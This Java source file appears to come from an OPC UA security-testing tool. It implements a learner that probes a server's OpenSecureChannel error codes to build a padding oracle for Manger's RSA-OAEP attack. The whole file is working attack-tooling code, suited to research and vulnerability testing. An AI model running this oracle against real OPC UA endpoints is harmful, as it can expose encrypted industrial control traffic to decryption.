package attacks.manger.oracle.learner;

import attacks.manger.MangerUtility;
import attacks.manger.oracle.DistinguishableErrorOracle;
import attacks.manger.oracle.Oracle;
import attacks.manger.oracle.OracleException;
import attacks.manger.oracle.VictimProxy;
import opcua.context.Endpoint;
import opcua.context.LocalKeyPair;
import opcua.encoding.EncodingException;
import opcua.message.ErrorMessage;
import opcua.message.OpenSecureChannelRequest;
import reporting.entry.Entry;
import reporting.entry.Group;
import reporting.entry.ValueEntry;
import transport.SecureChannelUtil;
import transport.TransportContext;
import transport.TransportException;
import transport.tcp.TcpClientUtil;

import java.io.IOException;

/**
 * Learner that tries to construct an oracle for Manger's attack, which distinguishes different error codes.
 */

public class ErrorCodeOracleLearner implements OracleLearner {

    private final int numberOfVerifications;
    private final LocalKeyPair localKeyPair;

    /**
     * Constructor
     * @param localKeyPair Certificate and private key to use for queries
     * @param numberOfVerifications How often to verify, if an error code was not returned by chance
     */
    public ErrorCodeOracleLearner(LocalKeyPair localKeyPair, int numberOfVerifications) {
        this.localKeyPair = localKeyPair;
        this.numberOfVerifications = numberOfVerifications;
    }

    /**
     * Constructor that will create a new self-signed certificate for queries
     * @param numberOfVerifications How often to verify, if an error code was not returned by chance
     */
    public ErrorCodeOracleLearner(int numberOfVerifications) {
        this.numberOfVerifications = numberOfVerifications;
        this.localKeyPair = LocalKeyPair.generateSelfSigned(2048, "CN:OpcUa-Attacker");
    }

    /**
     * Tries to learn an error code oracle for Manger's attack for a specific endpoint
     * @param endpoint Endpoint to test
     * @return The result of the learning, including the oracle, if successful
     * @throws OracleException if security configuration of endpoint does not allow for Manger's attack
     */
    @Override
    public LearningResult learn(Endpoint endpoint) throws OracleException {
        MangerUtility.throwIfSecurityConfigurationUnsupported(endpoint);

        try {
            byte[] validCipherText = SecureChannelUtil.generateEncryptedOpnRequest(endpoint, localKeyPair);
            VictimProxy victimProxy = new VictimProxy(endpoint, validCipherText);

            long errorCodeLessB = ((ErrorMessage)victimProxy.sendEncryptedPlainBlock(MangerUtility.generatePlaintextLessB(endpoint.getPublicKey())).getResponse()).getError();
            for (int i=0; i<numberOfVerifications; i++) {
                if(((ErrorMessage)victimProxy.sendEncryptedPlainBlock(MangerUtility.generatePlaintextLessB(endpoint.getPublicKey())).getResponse()).getError() != errorCodeLessB) {
                    return createFailureResult("Server responded with multiple error codes for \"<B\"");
                }
            }

            long errorCodeGeqB = ((ErrorMessage)victimProxy.sendEncryptedPlainBlock(MangerUtility.generatePlaintextGeqB(endpoint.getPublicKey())).getResponse()).getError();
            if (errorCodeLessB == errorCodeGeqB) {
                return createFailureResult("Server responded with equal error codes for \"<B\" and \">=B\" (\"" + Long.toHexString(errorCodeLessB) + "\")");
            }
            for (int i=0; i<numberOfVerifications; i++) {
                if(((ErrorMessage)victimProxy.sendEncryptedPlainBlock(MangerUtility.generatePlaintextGeqB(endpoint.getPublicKey())).getResponse()).getError() != errorCodeGeqB) {
                    return createFailureResult("Server responded with error codes for \">=B\"");
                }
            }

            Oracle oracle = new DistinguishableErrorOracle(endpoint, (ErrorMessage e) -> e.getError() == errorCodeLessB, validCipherText);
            Entry report = new Group("ErrorCodeOracleLearner")
                    .addSubEntry(new ValueEntry<>("Successful", true))
                    .addSubEntry(new ValueEntry<>("Error Code for \"<B\"", errorCodeLessB))
                    .addSubEntry(new ValueEntry<>("Error Code for \">=B\"", errorCodeGeqB));

            return new LearningResult(oracle, report);
        }
        catch (EncodingException | IOException e) {
            throw new OracleException(e);
        }
    }

    private static LearningResult createFailureResult(String reason) {
        Entry report = new Group("ErrorCodeOracleLearner")
                .addSubEntry(new ValueEntry<>("Successful", false))
                .addSubEntry(new ValueEntry<>("Reason", reason));
        return new LearningResult(report);
    }
}